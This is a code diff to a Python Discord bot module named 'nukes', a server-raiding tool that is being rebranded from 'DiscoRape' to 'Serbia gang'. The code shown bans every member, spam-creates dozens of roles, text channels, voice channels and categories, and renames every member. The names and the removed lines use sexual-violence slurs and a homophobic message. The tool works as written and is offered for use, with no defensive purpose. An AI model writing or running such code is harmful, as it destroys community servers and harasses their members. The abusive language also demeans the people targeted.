@@ -20,7 +20,7 @@ from colorama import Fore, init
 
 
 class nukes(commands.Cog):
-    """All hail DiscoRape we will bring the commoners to their knees"""
+    """All hail Serbia we will bring the commoners to their knees"""
 
     def __init__(self, bot):
         self.bot = bot
@@ -38,7 +38,7 @@ class nukes(commands.Cog):
         )
         for member in ctx.guild.members:
             try:
-                await member.ban()
+                await member.ban(3)
                 print(f"{Fore.GREEN}[-]banAll > {Fore.RESET}Banned: {member}")
             except Exception as e:
                 print(
@@ -59,10 +59,10 @@ class nukes(commands.Cog):
         for i in range(1, 25):
             try:
                 await ctx.guild.create_role(
-                    name=f"RAPED BY DISCORAPE https://daddie.xyz{i}"
+                    name=f"RAPED BY SERBIA GANG"
                 )
                 print(
-                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY DISCORAPE https://daddie.xyz{i}"
+                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY SERBIA GANG"
                 )
             except:
                 print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to make role")
@@ -71,28 +71,28 @@ class nukes(commands.Cog):
     async def channelcreate(self, ctx):
         """Spams the everloving fuck outta the channels voice text and category\nNote: It's a pain in the ass to clean up"""
         await ctx.message.delete()
-        await ctx.send("Time to spam super fucking gay shit")
+        await ctx.send("Time to spam shit")
         await ctx.send("Standby for spam creation")
         print(f"{Fore.RED}[-]CHANNEL > Spam channel creation has begun!")
         for i in range(1, 25):
             try:
                 await ctx.guild.create_text_channel(
-                    name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-SERBIA-GANG"
                 )
                 await ctx.guild.create_voice_channel(
-                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED-BY-SERBIA-GANG"
                 )
                 await ctx.guild.create_category(
-                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED-BY-SERBIA-GANG"
                 )
             except:
                 print("An error occured while trying to make the channels")
@@ -152,10 +152,10 @@ class nukes(commands.Cog):
         for i in range(1, 50):
             try:
                 await ctx.guild.create_role(
-                    name=f"NUKED BY DISCORAPE https://daddie.xyz {i}"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY DISCORAPE https://daddie.xyz {i}"
+                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED-BY-SERBIA-GANG"
                 )
             except Exception as e:
                 print(f"Error while makign role.\n\nError: {e}")
@@ -174,7 +174,7 @@ class nukes(commands.Cog):
         for member in ctx.guild.members:
             print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
             try:
-                await member.ban()
+                await member.ban(3)
                 print(
                     f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
                 )
@@ -187,22 +187,22 @@ class nukes(commands.Cog):
         for i in range(1, 25):
             try:
                 await ctx.guild.create_text_channel(
-                    name=f"NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-DISCORAPE-{i}-https://daddie.xyz"
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-SERBIA-GANG"
                 )
                 await ctx.guild.create_voice_channel(
-                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED-BY-SERBIA-GANG"
                 )
                 await ctx.guild.create_category(
-                    name=f"NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    name=f"NUKED-BY-SERBIA-GANG"
                 )
                 print(
-                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY DISCORAPE {i} https://daddie.xyz"
+                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED-BY-SERBIA-GANG"
                 )
             except Exception as e:
                 print(f"Error while making channels\nError: {e}")
@@ -210,7 +210,7 @@ class nukes(commands.Cog):
 
     @commands.command()
     async def undoreall(self, ctx):
-        """Renames every member in the server to raped by DiscoRape"""
+        """Renames every member in the server to raped by serbiagang"""
         await ctx.delete()
         rename_to = ""
         i = 0
@@ -229,9 +229,9 @@ class nukes(commands.Cog):
 
     @commands.command()
     async def reall(self, ctx):
-        """Renames every member in the server to raped by DiscoRape"""
+        """Renames every member in the server to raped by serbiagang"""
         await ctx.delete()
-        rename_to = "Raped by DiscoRape"
+        rename_to = "Raped by serbiagang"
         i = 0
         for user in list(ctx.guild.members):
             try:
